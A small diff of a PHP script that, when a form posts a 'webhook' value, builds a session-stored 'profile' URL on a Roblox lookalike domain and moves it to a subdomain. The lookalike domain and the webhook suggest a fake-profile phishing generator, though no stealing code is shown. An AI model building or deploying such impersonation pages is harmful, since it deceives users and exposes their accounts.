@@ -14,7 +14,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['webhook'])) {
         $_SESSION['profile_id'] = $profileId;
         
         // Create the custom profile URL
-        $profileUrl = "robloix.wuaze.com/profile/" . $profileId;
+        $profileUrl = "x.robloix.wuaze.com/profile/" . $profileId;
         
         // Store profile URL in session
         $_SESSION['profile_url'] = $profileUrl;
